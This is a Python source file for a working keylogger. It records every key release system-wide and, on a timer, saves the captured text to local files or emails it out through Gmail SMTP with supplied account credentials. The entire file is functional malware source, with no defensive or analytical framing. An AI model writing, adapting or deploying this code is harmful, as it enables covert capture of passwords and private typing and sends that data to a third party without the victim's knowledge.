import keyboard
from smtplib import SMTP
from threading import Timer
from datetime import datetime


class Keylogger:
	def __init__(self,  interval=60):
		self.interval: int = interval
		self.log: str = ""
		self.__start_datetime: datetime = datetime.now()
		self.__end_datetime: datetime = datetime.now()
		self.report_method: str = 'file'

	def configure_mail(self, email: str, password: str):
		self.email: str = email
		self.report_method: str = 'email'

		self.__server: SMTP = SMTP(host='smtp.gmail.com', port=587)
		self.__server.starttls()
		self.__server.login(self.email, password)

	def __callback(self, event):
		"""
		This callback is invoked whenever a keyboard event is occurred
		(i.e. when a key is released in this example)
		"""
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = ' '
			elif name == "enter":
				name = '[ENTER]\n'
			elif name == "decimal":
				name = '.'
			else:
				name = name.replace(' ', '_')
				name = f"[{name.upper()}]"
		self.log += name

	def __update_filename(self) -> None:
		start_datetime_str = str(self.__start_datetime)[:-7].replace(' ', '-').replace(':', '')
		end_datetime_str = str(self.__end_datetime)[:-7].replace(' ', '-').replace(':', '')
		self.filename = f"keylog-{start_datetime_str}_{end_datetime_str}"

	def __report_to_file(self) -> None:
		"""This method creates a log file in the current directory that contains
		the current keylogs in the `self.log` variable"""

		with open(f"{self.filename}.txt", 'wt') as f:
			print(self.log, file=f)

		print(f"[+] Saved {self.filename}.txt")

	def __sendmail(self, email, message) -> None:
		self.__server.sendmail(email, email, message)

	def __report(self):
		"""
		This function gets called every `self.interval`
		It basically sends keylogs and resets `self.log` variable
		"""
		if self.log:
			self.__end_datetime: datetime = datetime.now()
			self.__update_filename()

			if self.report_method == 'email':
				self.__sendmail(self.email, self.log)
			elif self.report_method == 'file':
				self.__report_to_file()

			# print(f"[{self.filename}] - {self.log}")
			self.__start_datetime: datetime = datetime.now()

		self.log = ""
		timer = Timer(interval=self.interval, function=self.__report)
		timer.daemon = True
		timer.start()

	def start(self) -> None:
		print("[+] Started")
		self.__start_datetime = datetime.now()
		keyboard.on_release(callback=self.__callback)
		self.__report()
		keyboard.wait()
		self.__server.quit()
